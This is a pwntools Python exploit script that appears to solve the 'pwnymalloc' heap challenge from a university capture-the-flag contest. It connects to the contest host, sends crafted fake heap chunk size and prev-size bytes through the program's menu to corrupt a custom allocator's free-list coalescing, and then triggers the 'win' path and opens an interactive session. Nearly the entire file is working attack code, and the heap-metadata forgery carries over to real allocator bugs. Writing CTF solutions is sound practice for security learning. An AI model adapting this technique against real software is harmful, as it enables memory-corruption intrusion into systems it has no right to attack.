#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'pwnymalloc.chal.uiuc.tf', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *coalesce
# break *free_list_remove+91
break *pwnymalloc
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chal
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled

def idk(data):
    log.info('IDK-ing...')
    io.sendlineafter(b'>', b'1')
    io.sendafter(b'complaint:', data.ljust(0x48-1, b'\x00'))
    sleep(0.2)

def pwnymalloc(amount, data):
    sleep(0.2)
    log.info('Pwnymallocing...')
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'refunded:', str(amount).encode())
    io.sendafter(b'request:', data.ljust(0x7f, b'\x00'))
    sleep(0.2)

    io.recvuntil(b'Your request ID is: ')
    return int(io.recvline().strip())

def win(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'ID:', str(idx).encode())

def exploit():
    global io
    io = initialize()

    fake_chunk = b'\x00' * 0x40 + b'\xd0'
    pwnymalloc(0x1, fake_chunk)

    fake_prev = b'\x00' * 0x78 + b'\xd0'
    win_idx = pwnymalloc(0x2, fake_prev) 

    idk(b'doesnt matter')

    pwnymalloc(0x4, p32(0x1) * (2 * 10))
 
    win(win_idx)

    io.interactive()
    
if __name__ == '__main__':
    exploit()